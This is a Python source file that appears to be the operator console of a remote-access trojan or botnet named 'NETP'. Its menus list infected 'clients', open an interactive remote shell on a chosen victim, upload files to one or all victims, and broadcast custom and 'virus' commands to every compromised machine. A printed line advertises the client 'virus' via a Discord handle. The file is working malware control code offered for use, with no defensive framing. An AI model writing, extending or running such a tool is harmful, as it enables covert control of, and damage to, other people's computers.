import sys
import os

from server import Server
from interface import Interface

global client, client_num, client_filename

def client_select():
    global client, client_num, client_filename
    client_num = ""
    client = ""

    if len(clients) == 0:
        print("You have no clients.")
        print("Get Client virus from Chunky#9092 on discord")
        main_loop()
    else:
        print(f"You have {len(clients)} client(s).")
        client_num = input("Which client (number)? ")
        client = server.get_client_cmd(client_num).split(".")[0]
        client_filename = client + ".txt"

        if client == 0:
            print("Invalid client number")
            main_loop()

    print("Selected client: " + client)
    client_select_loop()

def client_select_loop():
    while True:
        cmd = input(f"NETP/client/{client} $ ")
        
        if cmd == "help":
            interface.client_select_help()
        elif cmd == "sendfile":
            sendfile(True)
        elif cmd == "shell":
            client_shell()
        elif cmd == "info":
            print("\n" + server.get_client_info(client))
        elif cmd == "cc":
            custom_cmd_loop(True)
        elif cmd == "virus":
            virus_loop(True)
        elif cmd == "remove":
            server.remove_client(client_filename)
            print("Quitting when removed...")
            print("Successfully Removed: " + client)
            sys.exit()
        elif cmd == "exit":
            main_loop()
        else:
            print("Invalid command")

def all_loop():
    while True:
        cmd = input("NETP/All-Clients $ ")

        if cmd == "help":
            interface.all_help()
        elif cmd == "sendfile":
            sendfile(False)
        elif cmd == "cc":
            custom_cmd_loop(False)
        elif cmd == "virus":
            virus_loop(False)
        elif cmd == "remove":
            server.remove_all_clients()
        elif cmd == "exit":
            main_loop()
        else:
            print("Invalid command")

def custom_cmd_loop(client_bool):
    while True:
        if client_bool:
            cmd = input(f"Custom-Command/{client} $ ")
        else:
            cmd = input(f"Custom-Command/All-Clients $ ")

        if cmd != "help" and cmd != "exit" and cmd != "":
            if client_bool:
                server.send_custom_cmd(client, cmd)
                print("Waiting for Client response...")
                server.wait_custom_cmd_output(client_filename)
                open("custom_cmd/output/" + client_filename, "w").close()
                os.remove("custom_cmd/cmd_info.txt")
            else:
                server.send_custom_cmd("all", cmd)
                print("Waiting for Client responses...")
                server.wait_custom_cmd_all_output()
                os.remove("custom_cmd/cmd_info.txt")

                clients = []
                for _, _, f in os.walk("custom_cmd/output/"):
                    clients.extend(f)
                for x in clients:
                    open("custom_cmd/output/" + x, "w").close()
        if cmd == "help":
            interface.custom_cmd_help()
        if cmd == "exit":
            open("custom_cmd/cmd_info.txt", "w").close()
            if client_bool:
                client_select_loop()
            else:
                all_loop()
        if cmd == "":
            print("Cannot send empty string as command")

def virus_loop(client_bool):
    while True:
        if client_bool:
            cmd = input(f"Virus/{client} $ ")
        else:
            cmd = input(f"Virus/All-Clients $ ")

        if cmd != "help" and cmd != "exit" and cmd != "":
            if client_bool:
                server.send_virus(client, cmd)
                print("Waiting for Client response...")
                server.wait_virus_output(client_filename)
                open("vir/output/" + client_filename, "w").close()
                os.remove("vir/vir_info.txt")
            else:
                server.send_virus("all", cmd)
                print("Waiting for Client response...")
                server.wait_virus_all_output()
                os.remove("vir/vir_info.txt")

                clients = []
                for _, _, f in os.walk("vir/output/"):
                    clients.extend(f)
                for x in clients:
                    open("vir/output/" + x, "w").close()
        if cmd == "help":
            interface.virus_help()
        if cmd == "exit":
            open("vir/vir_info.txt", "w").close()
            if client_bool:
                client_select_loop()
            else:
                all_loop()
        if cmd == "":
            print("Cannot send empty string as command")

def sendfile(client_bool):
    file = input("Directory of file to send: ")
    client_dir = input("Directory to place file: ")

    if client_bool:
        server.sendfile(client, file, client_dir)
        print("Waiting for Client response...")
        server.wait_for_sendfile_output(client_filename)
        open("sendfile/output/" + client_filename, "w").close()
        os.remove("sendfile/" + file.split("/")[-1])
        os.remove("sendfile/file_info.txt")
        client_select_loop()
    else:
        server.sendfile("all", file, client_dir)
        print("Waiting for Client responses...")
        server.wait_for_sendfile_all_output()
        
        clients = []
        for _, _, f in os.walk("sendfile/output/"):
            clients.extend(f)
        for x in clients:
            open("sendfile/output/" + x, "w").close()
        
        os.remove("sendfile/" + file.split("/")[-1])
        os.remove("sendfile/file_info.txt")
    

def client_shell():
    machine_name = server.get_client_info(client).split(":")[3].split("\n")[0].strip() + f"(Client {client_num})"
    server.start_output_thread(client_num, machine_name)

    while True:
        cmd = input(f"Client-Machine/{machine_name} $ ")
        server.send_cmd(client_filename, cmd)

        if cmd == "exit":
            server.stop_output_thread()
            server.clear_cmd(client_filename)
            client_select_loop()

def client_loop():
    while True:
        cmd = input("NETP/client $ ")

        if cmd == "help":
            interface.client_help()
        elif cmd == "select":
            client_select()
        elif cmd == "all":
            all_loop()
        elif cmd == "exit":
            main_loop()
        else:
            print("Invalid command")

def main_loop():
    while True:
        cmd = input("NETP $ ")
        
        if cmd == "help":
            interface.help()
        elif cmd == "client":
            client_loop()
        elif cmd == "list":
            interface.list_()
        elif cmd == "online":
            print("This is may take up to 15 seconds")
            print("Checking for online clients...\n")
            server.check_online_clients()
        elif cmd == "exit":
            sys.exit(0)
        else:
            print("Invalid command")

server = Server()
clients = server.get_clients_cmd()
interface = Interface()
interface.logo()
main_loop()